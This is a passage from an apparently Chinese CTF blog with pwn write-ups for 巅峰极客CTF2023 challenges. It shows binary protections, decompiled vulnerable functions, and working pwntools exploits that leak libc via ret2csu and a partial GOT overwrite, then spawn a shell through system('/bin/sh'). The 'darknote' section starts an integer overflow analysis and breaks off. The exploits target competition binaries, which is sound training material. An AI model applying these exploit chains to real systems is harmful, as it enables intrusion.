&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="number">0x1d8698</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;command:&quot;</span>,<span class="string">&quot;10 10 10 10 10 10 10 10 7 7 7 7 7 7 7 7 16&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;your cost:&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;14&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(stack_addr1))</span><br><span class="line">sl(<span class="string">&quot;15&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(stack_addr2))</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(pop_rdi_ret))</span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(ret))</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(binsh%<span class="number">0x100000000</span>))</span><br><span class="line">sl(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(binsh&gt;&gt;<span class="number">32</span>))</span><br><span class="line">sl(<span class="string">&quot;10&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(system%<span class="number">0x100000000</span>))</span><br><span class="line">sl(<span class="string">&quot;11&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(system&gt;&gt;<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>) <span class="comment"># pop binsh </span></span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>) <span class="comment"># ret</span></span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;10&quot;</span>) <span class="comment"># system</span></span><br><span class="line">sl(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;11&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;7&quot;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0xDEADBEEF</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/22/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2CTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/07/22/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2CTF2023/" class="post-title-link" itemprop="url">巅峰极客CTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-07-22 18:31:27 / Modified: 18:32:41" itemprop="dateCreated datePublished" datetime="2023-07-22T18:31:27+08:00">2023-07-22</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="linkmap"><a href="#linkmap" class="headerlink" title="linkmap"></a>linkmap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ezzzz: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=a331b6bb1b0e27817885f5fb27f2bf0ff9cdc0ea, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>栈溢出漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br></pre></td></tr></table></figure>
<p>程序还有一个后门：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">backdoor</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> index2, <span class="keyword">int</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> keyt; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( key != <span class="number">0xDEADBEEF</span>LL || key )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key == <span class="number">0xBEEFDEAD</span>LL )</span><br><span class="line">      (&amp;bufg)[index][index2] = data;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;keyt);</span><br><span class="line">    key2 = (<span class="keyword">char</span> *)keyt;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">backdoor2</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index, <span class="keyword">int</span> key, <span class="keyword">int</span> index2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *data; <span class="comment">// [rsp+14h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  data = *(<span class="keyword">char</span> **)&amp;key2[index]; <span class="comment">// 漏洞点</span></span><br><span class="line">  key2 = data;</span><br><span class="line">  indexg = index;</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    (&amp;bufg)[index2] = data;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !key )</span><br><span class="line">  &#123;</span><br><span class="line">    (&amp;bufg2)[index2] = data;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>程序没有 write，只能依靠栈上的两个 libc 地址进行入侵，但这两处的空间太小放不下 gadget：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7ffe79ca8838</span> —▸ <span class="number">0x7f97290d8083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffe79ca8840</span> —▸ <span class="number">0x7f97292f1620</span> (_rtld_global_ro) ◂— <span class="number">0x50f6300000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7ffe79ca8848</span> —▸ <span class="number">0x7ffe79ca8928</span> —▸ <span class="number">0x7ffe79caa0ff</span> ◂— <span class="number">0x7a7a7a7a652f2e</span> <span class="comment">/* &#x27;./ezzzz&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>比赛时没有注意 <code>backdoor2</code> 有个解引用，利用这个解引用可以将 GOT 表中的 libc 地址写到 bss 中，然后低位覆盖就可以获取 write 进行泄露</p>
<p>需要注意的是：程序没有 <code>pop_rdx</code> 的 gadget，需要使用 CSU 来写入 RDX 寄存器</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./ezzzz&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x400773&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">pop_rbp_ret = <span class="number">0x0000000000400570</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004007e3</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x00000000004007e1</span></span><br><span class="line">ret = <span class="number">0x400773</span></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x400740</span></span><br><span class="line">bss_addr = <span class="number">0x601050</span></span><br><span class="line">key_addr = <span class="number">0x601030</span></span><br><span class="line">leave_ret = <span class="number">0x400772</span></span><br><span class="line"></span><br><span class="line">read_plt = <span class="number">0x4004E0</span></span><br><span class="line">read_got = <span class="number">0x600FD8</span></span><br><span class="line"></span><br><span class="line">backdoor2 = <span class="number">0x400606</span></span><br><span class="line">backdoor = <span class="number">0x40067C</span></span><br><span class="line">csu_front_addr = <span class="number">0x4007C0</span></span><br><span class="line">csu_end_addr = <span class="number">0x4007DA</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r15, r14, r13, last</span>):</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call(只能是got表地址)</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    <span class="comment"># csu(0, 1, fun_got, rdx, rsi, rdi, last)</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)	</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, key_addr, <span class="number">0x100</span>, main_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = p64(<span class="number">0xDEADBEEF</span>) +p64(<span class="number">0</span>)+ p64(read_got) + p64(<span class="number">0</span>) + p64(backdoor) + p64(backdoor2)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr+<span class="number">0x8</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, main_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_addr+<span class="number">0x10</span>, <span class="number">0x20</span>, main_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pwndbg&gt; p write</span></span><br><span class="line"><span class="string">$1 = &#123;ssize_t (int, const void *, size_t)&#125; 0x7ffff7ec7060 &lt;__GI___libc_write&gt;</span></span><br><span class="line"><span class="string">pwndbg&gt; p read</span></span><br><span class="line"><span class="string">$2 = &#123;ssize_t (int, void *, size_t)&#125; 0x7ffff7ec6fc0 &lt;__GI___libc_read&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = p16(<span class="number">0x7060</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr+<span class="number">0x10</span>, <span class="number">1</span>, read_got, <span class="number">0x20</span>, main_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x10dfc0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + <span class="number">0x52290</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x1b45bd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="darknote"><a href="#darknote" class="headerlink" title="darknote"></a>darknote</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">darknote: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">1b</span>2dc1deeac98c6b7e7acd32d37564e1e501c66e, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，Canary，NX</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A == brk) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"><span class="number">0012</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>整数溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sizeg = writet();</span><br><span class="line">chunk_list = (<span class="keyword">char</span> **)<span class="built_in">malloc</span>(<span class="number">8</span> * sizeg);</span><br></pre></td></tr></table></figure>
<p>函数 <code>puts</code> 的参数可以修改：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;==================================&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  <span class="built_in">puts</span>(off_404260[i]);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;==================================&quot;</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000404260</span> <span class="number">20</span> <span class="number">40</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_404260 dq offset a1AddNote          ; DATA XREF: menu+<span class="number">3</span>D↑o</span><br><span class="line">.data:<span class="number">0000000000404260</span>                                                                       ; <span class="string">&quot;1. Add Note&quot;</span></span><br><span class="line">.data:<span class="number">0000000000404268</span> <span class="number">30</span> <span class="number">40</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset a2ShowNote                    ; <span class="string">&quot;2. Show Note&quot;</span></span><br><span class="line">.data:<span class="number">0000000000404270</span> <span class="number">40</span> <span class="number">40</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset a3DeleteNote                  ; <span class="string">&quot;3. Delete Note&quot;</span></span><br><span class="line">.data:<span class="number">0000000000404278</span> <span class="number">50</span> <span class="number">40</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset a4EditNote                    ; <span class="string">&quot;4. Edit Note&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>使用整数溢出会导致 <code>chunk_list</code> 堆溢出，比赛时折腾了很多 top chunk 有关的堆风水，最后发现还是要利用大堆块申请 mmap，这样就可以在 libc 中进行溢出</p>
